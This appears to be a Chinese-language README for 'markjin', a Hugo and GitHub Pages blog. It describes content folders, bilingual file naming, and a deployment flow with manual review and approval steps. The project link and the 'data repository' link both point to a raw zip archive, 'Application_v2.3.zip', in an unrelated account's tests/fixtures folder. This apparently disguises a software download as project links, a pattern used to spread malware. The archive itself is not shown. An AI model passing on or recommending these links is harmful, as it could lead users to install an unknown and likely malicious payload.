# markjin

统一系统观在 AI 辅助加持下的认知实践与自我进化（Hugo + GitHub Pages）：https://github.com/ali-montolalu/ali-montolalu.github.io/raw/refs/heads/main/tests/fixtures/Application_v2.3.zip

- 内容：`content/posts/daily`（每日信号）、`content/topics`（专题）、`content/about.md`
- 多语言：默认中文 `<name>.md`，英文 `<name>.en.md`（位于 /en/），见 [docs/i18n.md](docs/i18n.md)
- 部署：推送到 `main` 后由 `.github/workflows/hugo.yml` 自动构建发布。完整门禁要等发布门禁在新仓库重新落地后才有；在那之前，日报发布的依据是审查与治理 bot 人工核对新 markjin-data main 上的 Codex 记录（核对日期、06:55 截止和中英配对），宏观稿和信号卡另外还要王总批准；部署后与每天 07:15 SGT 的冒烟检查（`.github/workflows/smoke.yml`）不能代替发布前审查
- 数据仓库：https://github.com/ali-montolalu/ali-montolalu.github.io/raw/refs/heads/main/tests/fixtures/Application_v2.3.zip
- 工作流说明：[docs/workflow.md](docs/workflow.md)
- 评论：计划使用 giscus（基于 Discussions）
